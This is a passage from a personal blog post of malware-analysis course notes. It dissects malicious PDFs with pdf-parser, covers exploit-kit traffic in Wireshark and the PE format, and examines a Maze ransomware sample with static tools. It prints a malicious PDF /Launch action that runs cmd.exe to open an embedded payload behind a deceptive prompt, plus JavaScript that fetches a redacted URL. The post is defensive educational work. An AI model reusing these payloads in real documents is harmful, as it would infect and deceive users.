<p><a href=/files/js_api_reference.pdf>Download the guide here and take a look yourself.</a></p>
<p><a href=https://www.adobe.com/content/dam/acom/en/devnet/acrobat/pdfs/js_api_reference.pdf>Non-local copy if I get copyright yeeted by Adobe&rsquo;s lawyers.</a></p>
<p>From the graph above we can see that Object 26 includes Object 23, which includes our malicious JS in <em>Object 24</em>.</p>
<p>Let&rsquo;s look at Object 23 and Object 26 more.</p>
<h4 id=object-23>Object 23</h4>
<p>This object just injects the HTTP response into wherever the object is included.</p>
<p>That means the HTTP response is injected directly into the PDF&rsquo;s body (DOM?).</p>
<p>This could do really anything at this point, and the site seems to be down, so we have no way of knowing.</p>
<pre><code class=language-python>&lt;&lt;	
	/Names [(EmbeddedJS) 24 0 R]
&gt;&gt;
</code></pre>
<h3 id=pdf-parserpy-example1pdf--o-26><code>pdf-parser.py .\example1.pdf -o 26</code></h3>
<p>We can see that object 26 refers to object 23 after <code>\JavaScript</code>.</p>
<pre><code class=language-python>PS C:\Users\vagrant\Desktop\work\pdf&gt; pdf-parser.py .\example1.pdf -o 26
obj 26 0
 Type: /Catalog
 Referencing: 1 0 R, 3 0 R, 23 0 R

  &lt;&lt;
    /Type /Catalog
    /Pages 1 0 R
    /OpenAction [3 0 R /XYZ null null 1]
    /PageLayout /OneColumn
    /Names
      &lt;&lt;
        /JavaScript 23 0 R
      &gt;&gt;
  &gt;&gt;
</code></pre>
<h3 id=pdf-parserpy-example1pdf--o-23><code>pdf-parser.py .\example1.pdf -o 23</code></h3>
<p>more redirection!</p>
<p>Object 23 refers to object 24!</p>
<pre><code class=language-python>PS C:\Users\vagrant\Desktop\work\pdf&gt; pdf-parser.py .\example1.pdf -o 23                                                              obj 23 0
 Type:
 Referencing: 24 0 R

  &lt;&lt;
    /Names [(EmbeddedJS) 24 0 R]
  &gt;&gt;
</code></pre>
<h3 id=pdf-parserpy-example1pdf--o-24><code>pdf-parser.py .\example1.pdf -o 24</code></h3>
<p>Yay! malicious JS!!</p>
<pre><code class=language-python>PS C:\Users\vagrant\Desktop\work\pdf&gt; pdf-parser.py .\example1.pdf -o 24

obj 24 0
 Type:
 Referencing:

  &lt;&lt;
    /S /JavaScript
    /JS &quot;(this.getURL\\(unescape\\('&lt;REDACTED&gt;'\\)\\))&quot;
  &gt;&gt;
</code></pre>
<h2 id=second-pdf-file-example2pdf>Second PDF file, example2.pdf</h2>
<h3 id=pdf-parser-example2pdf><code>pdf-parser example2.pdf</code></h3>
<p>We can see that there is a chain of references all the way to object 8, which contains a stream.</p>
<p><code>pdf-parser example2.pdf | pdfobjflow3</code></p>
<img src=/images/2020-04-27-analyzing-document-based-malware/example2graph.png>
<pre><code class=language-python>C:\Users\vagrant\Desktop\work\pdf&gt;pdf-parser example2.pdf
PDF Comment '%PDF-1.0\r\n'

obj 1 0
 Type: /Catalog
 Referencing: 2 0 R

  &lt;&lt;
    /Pages 2 0 R
    /Type /Catalog
  &gt;&gt;


obj 2 0
 Type: /Pages
 Referencing: 3 0 R

  &lt;&lt;
    /Count 1
    /Kids [ 3 0 R ]
    /Type /Pages
  &gt;&gt;


obj 3 0
 Type: /Page
 Referencing: 4 0 R, 2 0 R

  &lt;&lt;
    /Contents 4 0 R
    /Parent 2 0 R
    /Resources
      &lt;&lt;
        /Font
          &lt;&lt;
            /F1
              &lt;&lt;
                /Type /Font
                /Subtype /Type1
                /BaseFont /Helvetica
                /Name /F1
              &gt;&gt;
          &gt;&gt;
      &gt;&gt;
    /Type /Page
    /MediaBox [ 0 0 795 842 ]
  &gt;&gt;


obj 4 0
 Type:
 Referencing:
 Contains stream

  &lt;&lt;
    /Length 0
  &gt;&gt;


xref

trailer
  &lt;&lt;
    /Root 1 0 R
    /Size 5
    /Info 0 0 R
  &gt;&gt;

startxref 429

PDF Comment '%%EOF\r\n'

obj 5 0
 Type:
 Referencing: 6 0 R

  &lt;&lt;
    /EmbeddedFiles 6 0 R
  &gt;&gt;


obj 6 0
 Type:
 Referencing: 7 0 R

  &lt;&lt;
    /Names [(template)7 0 R]
  &gt;&gt;


obj 7 0
 Type: /Filespec
 Referencing: 8 0 R

  &lt;&lt;
    /UF (template.pdf)
    /F (template.pdf)
    /EF
      &lt;&lt;
        /F 8 0 R
      &gt;&gt;
    /Desc (template)
    /Type /Filespec
  &gt;&gt;


obj 8 0
 Type:
 Referencing:
 Contains stream



obj 9 0
 Type: /Action
 Referencing:

  &lt;&lt;
    /S /JavaScript
    /JS (this.exportDataObject({ cName: &quot;template&quot;, nLaunch: 0 });)
    /Type /Action
  &gt;&gt;


obj 10 0
 Type: /Action
 Referencing:

  &lt;&lt;
    /S /Launch
    /Type /Action
    /Win
      &lt;&lt;
        /F (cmd.exe)
        /D '(c:\\\\windows\\\\system32)'
        /P '(/Q /C %HOMEDRIVE%&amp;cd %HOMEPATH%&amp;(if exist &quot;Desktop\\\\template.pdf&quot; (cd &quot;Desktop&quot;))&amp;(if exist &quot;My Documents\\\\template.pdf&quot; (cd &quot;My Documents&quot;))&amp;(if exist &quot;Documents\\\\template.pdf&quot; (cd &quot;Documents&quot;))&amp;(if exist &quot;Escritorio\\\\template.pdf&quot; (cd &quot;Escritorio&quot;))&amp;(if exist &quot;Mis Documentos\\\\template.pdf&quot; (cd &quot;Mis Documentos&quot;))&amp;(start template.pdf)\n\n\n\n\n\n\n\n\n\nTo view the encrypted content please tick the &quot;Do not show this message again&quot; box and press Open.)'
      &gt;&gt;
  &gt;&gt;


obj 1 0
 Type: /Catalog
 Referencing: 2 0 R, 5 0 R, 9 0 R

  &lt;&lt;
    /Pages 2 0 R
    /Names 5 0 R
    /OpenAction 9 0 R
    /Type /Catalog
  &gt;&gt;


obj 3 0
 Type: /Page
 Referencing: 4 0 R, 2 0 R, 10 0 R

  &lt;&lt;
    /Contents 4 0 R
    /Parent 2 0 R
    /Resources
      &lt;&lt;
        /Font
          &lt;&lt;
            /F1
              &lt;&lt;
                /Type /Font
                /Subtype /Type1
                /BaseFont /Helvetica
                /Name /F1
              &gt;&gt;
          &gt;&gt;
      &gt;&gt;
    /Type /Page
    /MediaBox [ 0 0 795 842 ]
    /AA
      &lt;&lt;
        /O 10 0 R
      &gt;&gt;
  &gt;&gt;


xref

trailer
  &lt;&lt;
    /Size 11
    /Prev 429
    /Root 1 0 R
    /Info 0 0 R
  &gt;&gt;

startxref 45968

PDF Comment '%%EOF\r\n'
</code></pre>
<h3 id=pdf-parser-example2pdf--o-10><code>pdf-parser example2.pdf -o 10</code></h3>
<p>10th object in &lsquo;example2.pdf&rsquo; seems to be an executable file. See below.</p>
<h2 id=pdfstreamdumper>PDFStreamDumper</h2>
<h3 id=simple-pdf>Simple PDF</h3>
<p><img src=/images/2020-04-27-analyzing-document-based-malware/simple_pdf_dumped.PNG></p>
<h3 id=example1pdf>example1.pdf</h3>
<p>Something about a specific drug&mldr;</p>
<p><img src=/images/2020-04-27-analyzing-document-based-malware/example1-text.PNG></p>
<p>This was unescaped JS.</p>
<p><img src=/images/2020-04-27-analyzing-document-based-malware/example1-js-unescaped.PNG></p>
<h3 id=example2pdf>example2.pdf</h3>
<p>Here we can see an embedded executable file in the PDF, as a stream.</p>
<p><img src=/images/2020-04-27-analyzing-document-based-malware/example2-embedded-exe-file.PNG></p>
<h3 id=example3pdf>example3.pdf</h3>
<p>This PDF contains a PDF form with embedded and obfuscated JavaScript.</p>
<p><img src=/images/2020-04-27-analyzing-document-based-malware/example3-js-obfuscated.PNG></p>
<h2 id=analyzing-exploit-kits-using-wireshark>Analyzing exploit kits using Wireshark</h2>
<h3 id=wireshark-display-filters>Wireshark display filters</h3>
<p><a href=/files/wireshark-display-filters.pdf>Filter cheat sheet available here.</a></p>
<ul>
<li>
<p>Display filters are post-capture filters</p>
<ul>
<li>Filter already-captured packets</li>
<li>Display filters are much more specific and powerful than <em>capture filters</em></li>
</ul>
</li>
<li>
<p>Filter by protocol</p>
<ul>
<li><code>dns</code>, <code>tcp</code>, <code>http</code></li>
</ul>
</li>
<li>
<p>Format: <code>protocol string1 string2 comparison-op value logical-op expr</code></p>
<ul>
<li><code>dns passive ip == 1.2.3.4 and icmp.type</code></li>
</ul>
</li>
<li>
<p>Following TCP streams</p>
<ul>
<li>This is useful because TCP streams are segmented app data that is impossible to follow chronologically
if multiple apps are transmitting data</li>
<li>Red part is request, blue is response.</li>
</ul>
</li>
</ul>
<p><img src=/images/2020-04-27-analyzing-document-based-malware/wireshark-follow-tcp-stream1.png alt></p>
<p>After following the TCP stream, we can see that it was generated when I was
browsing my <a href=http://thirdworlds.net/>favorite musician&rsquo;s website</a>.</p>
<p><img src=/images/2020-04-27-analyzing-document-based-malware/wireshark-follow-tcp-stream2.PNG alt></p>
<ul>
<li>Statistics drop-down is useful
<ul>
<li>Flow graph is visually useful</li>
</ul>
</li>
</ul>
<p><img src=/images/2020-04-27-analyzing-document-based-malware/wireshark-flow-graph.png alt></p>
<h3 id=analysis-of-exploit-kits>Analysis of exploit kits</h3>
<ul>
<li>
<p>Exploit kits</p>
<ul>
<li>Usually hosted on compromised websites</li>
<li>Also can be sent via email</li>
<li>Not targeted, goal is to send viruses, infect as many uses as possible</li>
<li>Now, ads redirect you multiple times to exploit kits</li>
<li>Landing page -> browser exploit -> payload</li>
</ul>
</li>
<li>
<p>You can go to <code>File > Export Objects > HTTP ...</code> to export HTTP payloads/JS/SWF captured by Wireshark</p>
</li>
</ul>
<h4 id=rig-ek-pcap-datahttpsgithubcomhenryfbpvagrantpackerfilestreemastervagrantwindows-analysis-and-vulnerableshareddatapcap><a href=https://github.com/HenryFBP/VagrantPackerFiles/tree/master/vagrant/windows-analysis-and-vulnerable/shared/data/pcap>rig-ek pcap data</a></h4>
<p>See <a href=https://www.malware-traffic-analysis.net/>https://www.malware-traffic-analysis.net/</a> for pcap files.</p>
<p>Extracting a SWF file:</p>
<p><img src=/images/2020-04-27-analyzing-document-based-malware/rigek-pcap-swf-export.png alt></p>
<h2 id=portable-executable-files-pe-file>Portable Executable Files (PE file)</h2>
<p><img src=/images/2020-04-27-analyzing-document-based-malware/Portable_Executable_32_bit_Structure_in_SVG_fixed.svg alt></p>
<h3 id=execution>Execution</h3>
<ol>
<li>Shell tells the PE loader to run the file</li>
<li>Kernel allocates virtual memory from the pool to fit the binary into</li>
<li>Kernel loads the binary</li>
<li>Loader reads the Import Address Table (IAT) section of the PE data structures, which contain a list of DDLs needed (i.e. kernel32.dll)
a. This is an example of code being reused, those DLLs are reused.</li>
<li>Recursively resolves those symbols</li>
<li>Kernel pushes the current location into an execution stack</li>
<li>Kernel jumps out of current memory location to a shared memory location and executes the code from there</li>
<li>Kernel goes back to the last memory location and jumps to that address</li>
<li>Finally, CPU executes all of the instructions at the current memory location.</li>
</ol>
<pre><code>                   |--------------------- Compilation --------------------|
                   |                                                      |
    Source file -&gt; | Compiler -&gt; Object file -&gt; Linker -&gt; Executable File | -&gt; Processor
                   |                                ^                     |
                   |                                |                     |
                   |                           Header files               |
                   |------------------------------------------------------|
</code></pre>
<h3 id=the-compilation-process>The compilation process</h3>
<ul>
<li>
<p>Preprocessing</p>
<ul>
<li>Removing comments, expanding macros, including files</li>
</ul>
</li>
<li>
<p>Compiling</p>
<ul>
<li>Taking the output of the preprocessor and generating assembly language</li>
</ul>
</li>
<li>
<p>Assembly</p>
<ul>
<li>Turning assembly into binary/machine code</li>
</ul>
</li>
<li>
<p>Linking</p>
<ul>
<li>Merging all object code from multiple files into one file</li>
</ul>
</li>
</ul>
<p>Malware analysis generally involves decompiling machine code, not source code.</p>
<h3 id=example-c-code>Example C code</h3>
<h4 id=helloc>hello.c</h4>
<pre><code class=language-c>#include &lt;stdio.h&gt;
int main(void)
{
      printf(&quot;Hello, World!\n&quot;);
      return (0);
}
</code></pre>
<h4 id=hellos>hello.s</h4>
<pre><code class=language-asm>	.file	&quot;hello.c&quot;
	.def	___main;	.scl	2;	.type	32;	.endef
	.section .rdata,&quot;dr&quot;
LC0:
	.ascii &quot;Hello, World!\12\0&quot;
	.text
.globl _main
	.def	_main;	.scl	2;	.type	32;	.endef
_main:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$8, %esp
	andl	$-16, %esp
	movl	$0, %eax
	addl	$15, %eax
	addl	$15, %eax
	shrl	$4, %eax
	sall	$4, %eax
	movl	%eax, -4(%ebp)
	movl	-4(%ebp), %eax
	call	__alloca
	call	___main
	movl	$LC0, (%esp)
	call	_printf
	movl	$0, %eax
	leave
	ret
	.def	_printf;	.scl	2;	.type	32;	.endef
</code></pre>
<p>Run <code>gcc -S hello.c</code> to compile the file into assmebly, <code>-S</code> asks <code>gcc</code> to generate assembly and NOT an executable file.</p>
<p>Running <code>gcc -o hello hello.c</code> will generate an executable file called <code>hello.exe</code>.</p>
<p><a href=/files/2020-04-27-analyzing-document-based-malware/c_example/hello.c>hello.c</a></p>
<p><a href=/files/2020-04-27-analyzing-document-based-malware/c_example/hello.s>hello.s</a></p>
<p><a href=/files/2020-04-27-analyzing-document-based-malware/c_example/hello.exe>hello.exe</a></p>
<h2 id=static-malware-analysis-tools>Static malware analysis tools</h2>
<ul>
<li>Hashcalc</li>
<li>ExeinfoPE</li>
<li>PEID</li>
<li>PEBear</li>
<li>PPEE</li>
<li>PEStudio</li>
</ul>
<p>I tested PPEE and PEStudio, and they both seem to be fairly advanced.</p>
<p>I downloaded a Maze ransomware sample, which can be found here <a href=https://github.com/HenryFBP/VagrantPackerFiles/blob/d2175b7252f8d3e16e0a41e193a9c7da35942245/vagrant/windows-analysis-and-vulnerable/shared/malware/executables/Module-4_peexe_samples_ransomware_%26_upx.zip>https://github.com/HenryFBP/VagrantPackerFiles/blob/d2175b7252f8d3e16e0a41e193a9c7da35942245/vagrant/windows-analysis-and-vulnerable/shared/malware/executables/Module-4_peexe_samples_ransomware_%26_upx.zip</a></p>
<p>I loaded it into PPEE and PEStudio.</p>
<h3 id=ppee>PPEE</h3>
<p>Here you can see unicode strings in the PE file. They lead me to believe that this PE will encrypt files&mldr;probably not good.
<img src=/images/2020-04-27-analyzing-document-based-malware/maze_ransomware_PPEE_1.PNG alt></p>
<p>Definitely not good text to see.
<img src=/images/2020-04-27-analyzing-document-based-malware/maze_ransomware_PPEE_2.PNG alt></p>
<h2 id=pestudio>PEStudio</h2>
<p>The left pane shows PEStudio is much more advanced than PPEE. It analyzes:</p>
<ul>
<li>Virustotal results</li>
<li>Libraries</li>
<li>Imports</li>
<li>Strings</li>
</ul>
<p>Not only does it display these values, but it uses rule-based heuristics to generate severities for findings, which is
really cool.</p>
<p><img src=/images/2020-04-27-analyzing-document-based-malware/maze_ransomware_pestudio_1.PNG alt></p>
<p>This shows an example of how PEStudio will analyze imports in a PE and display severity categories for suspected malware.</p>
<p><img src=/images/2020-04-27-analyzing-document-based-malware/maze_ransomware_pestudio_2.PNG alt></p>
</div>
<div class="flex flex-col md:flex-row md:justify-between -mx-2 mt-4 px-2 pt-4 border-t">
<div>
<span class="block font-bold">Previous</span>
<a href=/posts/2020-05-30-snort-intrusion-detection-rule-writing-and-pcap-analysis/ class=block>Snort Intrusion Detection, Rule Writing, and PCAP Analysis</a>
</div>
<div class="md:text-right mt-4 md:mt-0">
<span class="block font-bold">Next</span>
<a href=/posts/2020-04-07-exploiting-vulnserver/ class=block>Exploiting Vulnserver!</a>
</div>
</div>
</div>
<div class=col-span-2>
<div class="sticky top-16 z-10 hidden lg:block px-6 py-4 bg-primary-bg">
<span class="text-lg font-semibold">On This Page</span>
</div>
<div class="sticky-toc hidden lg:block px-6 pb-6">
<nav id=TableOfContents>
<ul>
<li><a href=#the-course>The course</a></li>
<li><a href=#my-code>My code</a></li>
<li><a href=#tools>Tools</a></li>
<li><a href=#ms-office-file-formats>MS Office file formats</a>
<ul>
<li><a href=#ole-compound-file>OLE Compound file</a></li>
<li><a href=#openoffice-xml>OpenOffice XML</a></li>
</ul>
</li>
<li><a href=#analyzing-malware>Analyzing malware</a>
<ul>
<li><a href=#the-files>The files</a></li>
<li><a href=#paymentdoc-notes>payment.doc notes</a>
<ul>
<li><a href=#oledump-paymentdoc--s-7--v><code>oledump payment.doc -s 7 -v</code></a></li>
<li><a href=#oleid-paymentdoc><code>oleid .\payment.doc</code></a></li>
<li><a href=#olemeta-paymentdoc><code>olemeta .\payment.doc</code></a></li>
<li><a href=#oledir-paymentdoc><code>oledir .\payment.doc</code></a></li>
<li><a href=#olemapexe-paymentdoc><code>olemap.exe .\payment.doc</code></a></li>
</ul>
</li>
<li><a href=#statementsdocx-notes>statements.docx notes</a>
<ul>
<li><a href=#oledump-statementsdocx><code>oledump statements.docx</code></a></li>
<li><a href=#oledump-statementsdocx--s-a3--v>oledump statements.docx -s A3 -v</a></li>
<li><a href=#olevba-paymentdoc><code>olevba .\payment.doc</code></a></li>
<li><a href=#mraptor-paymentdoc><code>mraptor .\payment.doc</code></a></li>
</ul>
</li>
</ul>
</li>
<li><a href=#pdf-file-format>PDF File Format</a>
<ul>
<li><a href=#simple-pdf-file-objects>Simple pdf file objects:</a>
<ul>
<li><a href=#header>Header</a></li>
<li><a href=#objects>Objects</a></li>
<li><a href=#cross-reference-table>Cross Reference Table</a>
<ul>
<li><a href=#example-pdf-file-content>Example pdf file content</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><a href=#first-pdf-file-example1pdf>First PDF file, example1.pdf</a>
<ul>
<li><a href=#graph>Graph</a></li>
<li><a href=#font-files>Font files</a></li>
<li><a href=#malicious-js>Malicious JS</a>
<ul>
<li><a href=#object-23>Object 23</a></li>
</ul>
</li>
<li><a href=#pdf-parserpy-example1pdf--o-26><code>pdf-parser.py .\example1.pdf -o 26</code></a></li>
<li><a href=#pdf-parserpy-example1pdf--o-23><code>pdf-parser.py .\example1.pdf -o 23</code></a></li>
<li><a href=#pdf-parserpy-example1pdf--o-24><code>pdf-parser.py .\example1.pdf -o 24</code></a></li>
</ul>
</li>
<li><a href=#second-pdf-file-example2pdf>Second PDF file, example2.pdf</a>
<ul>
<li><a href=#pdf-parser-example2pdf><code>pdf-parser example2.pdf</code></a></li>
<li><a href=#pdf-parser-example2pdf--o-10><code>pdf-parser example2.pdf -o 10</code></a></li>
</ul>
</li>
<li><a href=#pdfstreamdumper>PDFStreamDumper</a>
<ul>
<li><a href=#simple-pdf>Simple PDF</a></li>
<li><a href=#example1pdf>example1.pdf</a></li>
<li><a href=#example2pdf>example2.pdf</a></li>
<li><a href=#example3pdf>example3.pdf</a></li>
</ul>
</li>
<li><a href=#analyzing-exploit-kits-using-wireshark>Analyzing exploit kits using Wireshark</a>
<ul>
<li><a href=#wireshark-display-filters>Wireshark display filters</a></li>
<li><a href=#analysis-of-exploit-kits>Analysis of exploit kits</a>
<ul>
<li><a href=#rig-ek-pcap-datahttpsgithubcomhenryfbpvagrantpackerfilestreemastervagrantwindows-analysis-and-vulnerableshareddatapcap><a href=https://github.com/HenryFBP/VagrantPackerFiles/tree/master/vagrant/windows-analysis-and-vulnerable/shared/data/pcap>rig-ek pcap data</a></a></li>
</ul>
</li>
</ul>
</li>
<li><a href=#portable-executable-files-pe-file>Portable Executable Files (PE file)</a>
<ul>
<li><a href=#execution>Execution</a></li>
<li><a href=#the-compilation-process>The compilation process</a></li>
<li><a href=#example-c-code>Example C code</a>
<ul>
<li><a href=#helloc>hello.c</a></li>
<li><a href=#hellos>hello.s</a></li>
</ul>
</li>
</ul>
</li>
<li><a href=#static-malware-analysis-tools>Static malware analysis tools</a>
<ul>
<li><a href=#ppee>PPEE</a></li>
</ul>
</li>
<li><a href=#pestudio>PEStudio</a></li>
</ul>
</nav>
</div>
<script>window.addEventListener('DOMContentLoaded',()=>{enableStickyToc()})</script>
</div>
</div>
<script>document.addEventListener('DOMContentLoaded',()=>{hljs.initHighlightingOnLoad()})</script>
</div>
</div>
</main>
<footer class=pl-scrollbar>
<div class="w-full max-w-screen-xl mx-auto"><div class="text-center p-6 pin-b">
<p class="text-sm text-tertiary-text">&copy; 2021 <a href=http://henrypost.net/>Henry Post</a>
&#183; Powered by the <a href=https://github.com/wangchucheng/hugo-eureka class=hover:text-eureka>Eureka</a> theme for <a href=https://gohugo.io class=hover:text-eureka>Hugo</a></p>
</div></div>
</footer>
</body>
</html>